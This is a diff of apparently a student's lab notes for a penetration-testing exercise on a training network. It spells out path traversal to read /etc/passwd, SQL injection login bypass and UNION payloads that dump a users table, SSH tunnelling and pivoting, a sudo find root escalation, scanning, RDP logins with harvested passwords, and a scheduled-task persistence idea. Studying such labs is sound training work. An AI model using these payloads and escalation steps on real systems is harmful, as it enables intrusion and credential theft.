@@ -51,7 +51,7 @@ Data is only encoded into base64
 
 10.50 assigned. -> 10.50.29.144 (public facing) 
 
-### 1. PublicFacingWebsite ###
+### 1. PublicFacingWebsite - 001 ###
 
 #### Perform Reconnaissance  ####
 
@@ -87,15 +87,51 @@ Step 3. Open reminna and login to your linops and open firefox on there. Enter t
 
 Step 4. wget on the `wget -r http://10.50.29.144:80` to download all the files for this address
 
+Do the statements below where there are search pages..
+or ... http://10.50.29.144/getcareers.php?myfile=../../../../../../../../etc/hosts
+or ... http://10.50.29.144/getcareers.php?myfile=../../../../../../../../etc/passwd
+
+        root:x:0:0:root:/root:/bin/bash
+        user2:.....:/bin/sh -> means the user2 can run bash commands 
+
+
 Step 5. Check /login.html -> gives a login page. Lets try to sql inject it
 
     1. In both the password and username field, enter: tom' or 1='1
     2. Displays a user, welcome Aaron
 
 
+Method 2: change inspect element to GET will display
+
+        Array
+        (
+            [0] => user2
+            [name] => user2
+            [1] => RntyrfVfNER78
+            [pass] => RntyrfVfNER78
+        )
+        1Array
+        (
+            [0] => user3
+            [name] => user3
+            [1] => Obo4GURRnccyrf
+            [pass] => Obo4GURRnccyrf
+        )
+        1Array
+        (
+            [0] => Lee_Roth
+            [name] => Lee_Roth
+            [1] => anotherpassword4THEages
+            [pass] => anotherpassword4THEages
+        )
+
+If a password is not readable check ROT13 -> https://rot13.com/
+
+Cyberchef -> http://10.50.20.30:8000/themes/BattleMap/static/cyberchef.htm
+
 Step 6. Check /login.php
 
-    1. Displays a user, welcome Aaron
+    1. Displays a user, welcome Aaron -> since it says Aaron, it means you're in. 
     2. username could potentially be Aaron
 
 Step 7. Check /img/
@@ -129,7 +165,18 @@ Step 1. Since tcp and http were open and we've looked at the http section, lets 
 
 Step 2. `ssh user2@10.50.29.144 -D 9050` let's dynamically connect to this user 
 
+other -> type `bash`
+
+If you forgot something in htlm you go to `cd /var/www/html/`
+
 Step 3. logs us in... let's see if we can find additional targets
+
+user2@PublicFacingWebsite:/var/www/html$ `ls -la` to see all the files 
+
+    -rw-r--r-- 1 root root   215 Dec 30 02:01 logout.php -> means this is a file
+    drwxr-xr-x 2 root root  4096 Jan 16 17:41 scripts -> means this is a directory
+
+Once you are able to get in, enumerate the file more. Look for hidden files!
 
 #### Find Additional Targets ####
 
@@ -147,8 +194,6 @@ Step 1. `cat /etc/hosts` gives us an additional host
     192.168.28.181 WebApp
 
 Step 2. Looks like we have a new host called WebApp at 192.168.28.181
-
-Step 3. EaglesIsARE78
 
 #### Pivot to Found Targets ####
 
@@ -198,17 +243,21 @@ Step 6. Since .181 has an http open, let's do an enumeration scan on him. studen
 
 Step 7. Change the proxy settings. Check notes on how to do this 
 
-Step 8. http://192.168.28.181/pick.php?product=7 or 1=1
+#### Step 1 of schema table ####
 
-Step 9. http://192.168.28.181/pick.php?product=7 Union SELECT 1,2,3
+Step 8. `http://192.168.28.181/pick.php?product=7 or 1=1` increase product until it breaks. Look at the view page source to see how the code looks like. 
+
+#### Step 2 of schema table ####
+
+Step 9. Validate the columns `http://192.168.28.181/pick.php?product=7 union SELECT 1,2,3` Notice that this is also out of order. 
 
 Step 10. Golden statement `http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns`
 
+#### Step 3 of schema table ####
 
+other way -> `http://192.168.28.181/pick.php?product=7 union select table_schema, 2,3 FROM information_schema.columns` -> shows the types
 
-FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select siteusers, users, username FROM information_schema.columns`
-
-FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select siteusers, users, name FROM siteusers.users`
+other way class -> `http://192.168.28.181/pick.php?product=7 union select user_id,name,username FROM siteusers.users` 
 
 Tabel_schema = database name = siteusers
 
@@ -221,9 +270,6 @@ Right click to duplicate the tab
 /uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
 
 http://192.168.28.181/pick.php?product=7 union select table_schema, column_name, table_name FROM information_schema.columns
-
-
-FAILED TO WORK Step 11. Select important information - `http://192.168.28.181/pick.php?product=7 union select name, users,username,user_id FROM siteusers.users`
 
         Item 	On Hand 	Price
         HAM 	32 	        $15
@@ -248,19 +294,19 @@ Step 11. Select important information - `http://192.168.28.181/pick.php?product=
         3 	    Obo4GURRnccyrf 	            $user3
         4 	    anotherpassword4THEages 	$Lroth
 
-Step 12. We have password= ncnffjbeqlCn$$jbeq 	       username= $Aaron. Let's ssh to .172 with this information
+Step 12. We have password= ncnffjbeqlCn$$jbeq username= $Aaron. Let's ssh to .172 with this information
 
 Step 13. Let's create a local tunnel to .172 and use Aaron's credentials 
 
 student@lin-ops:~$ ssh user2@10.50.29.144 -L 43434:192.168.28.172:22
-student@lin-ops:~$ ssh Aaron@localhost -p 43434
+student@lin-ops:~$ `ssh Aaron@127.0.0.1 -p 43434` if Aaron woudn't have worked then I'd try user2, user3 and Lroth with the respective passwords 
 
 convert ncnffjbeqlCn$$jbeq to ROTH13 using https://rot13.com/ gives the password as apasswordyPa$$word
 
 
 ### 2. BestWebApp ###
 
-
+TODO: Review notes for this guy. 
 
 #### Perform Reconnaissance  ####
 
@@ -270,9 +316,21 @@ convert ncnffjbeqlCn$$jbeq to ROTH13 using https://rot13.com/ gives the password
 
 #### Pivot to Found Targets ####
 
-### 3. RoundSensor ###
+### 3. RoundSensor  --02 ###
 
-#### Perform Reconnaissance  ####
+#### Attempt Exploitation || Gain Initial Access and Perform Reconnaissance  ####
+
+Step 00. `cat /etc/passwd` -> nothing on here it's only root and aaron 
+
+Step 0a. `cat /etc/hosts` -> Nothing on here
+
+Step 0b. `Aaron@RoundSensor:/$ cat /etc/crontab `?????
+
+Step 0c. What else again????? TODO? And everything we did on linux day pretty much... syslog and rsyslog conf files 
+
+Step 0d. `netstat -tunap` # check for local listening ports 
+
+
 
 Step 1. Check what Aaron can run e.g. `sudo -l` which gives the following 
 
@@ -284,12 +342,17 @@ Step 1. Check what Aaron can run e.g. `sudo -l` which gives the following
     User Aaron may run the following commands on RoundSensor:
     (ALL) NOPASSWD: /usr/bin/find
 
+Step 0e. Find the SIDor the SGID file that looks out of place comrade@lin1:~$ `find / -type f -perm /6000 -ls 2>/dev/null`
 
-Step 2. Go to GTFO bins and find the vulnerability for find. 
+Step 2. Go to GTFO bins and find the vulnerability for find. -> https://gtfobins.github.io/
 
 Step 3. The following command run and changed the user to root `sudo find . -exec /bin/sh \; -quit`
 
-Step 4. You know have root privileges
+Step 4. You know have root privileges -> Explore everything in the root directory
+
+Step 0f. `cd root`, try to cut and see everything in root `ls` and `ls -la .ssh/authorized_keys` and `cat ab.sh` -> what port is listening on this ssh??? and `ps -elf`and `cat run` and `cat /lib/libhandle.10`
+
+#### Find Additional Targets ####
 
 Step 5. Run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done` to see which ips are open and this gives 
 
@@ -298,7 +361,9 @@ Step 5. Run `for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" 
         64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.353 ms
         64 bytes from 192.168.28.222: icmp_seq=1 ttl=64 time=5.92 ms
 
-Step 6. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.179`
+        Notice the ttl, ttl for windows is 128. 
+
+Step 6. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap -Pn 192.168.28.179`
 
         Nmap scan report for 192.168.28.179
         Host is up (0.00056s latency).
@@ -321,28 +386,43 @@ Step 8. Check 192.168.28.181. student@lin-ops:~$ `proxychains nmap 192.168.28.22
 
         Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
 
+#### Pivot to Found Targets ###
+ ####
+
 Step 9: Create a local tunnel from extranet to Internal IP
 
 student@lin-ops:~$ `ssh Aaron@localhost -p 43434 -L 43435:192.168.28.179:3389` 
 
-Step 10:
-
-Use xrdp to get in the windows box
+Step 10: Use xrdp to get in the windows box
 
 student@lin-ops:~$ `xfreerdp /v:127.0.0.1:43435 /u:Lroth /p:anotherpassword4THEages /size:1920x1000 +clipboard /cert-ignore` 
 
-#### Attempt Exploitation || Gain Initial Access ####
-
-#### Find Additional Targets ####
-
-### Pivot to Found Targets ###
-
-### 4. Windows-Workstation ###
+### 4. Windows-Workstation --003 ###
 
 #### Perform Reconnaissance  ####
+
+Enter the contents of the files in your users directory - > C:\Users\Lroth\
+
+        C:\Users\Public\Documents\
+
+Ask about persistence Registry 
+
+        Registry Editor 
+        Services  -> Description
+        Task Scheduler / Manager  -> Schedule
+
+            See Work in this example something named weird   
+            Actions -> Users\Lroth\temp\putty.exe
+            Go to this directory and see if you can create a test file 
+
+                Proves you can write to this directory and you are either going to create a new executable or replace a dll here
+            
+            What if you could rename putty? That means you can put your executable and rename it. You will have a server to pull it from. 
 
 #### Attempt Exploitation || Gain Initial Access ####
 
 #### Find Additional Targets ####
 
 #### Pivot to Found Targets ####
+
+TODO: REVIEW METASPOILT AND PUT THE NOTES ON HERE!!! 
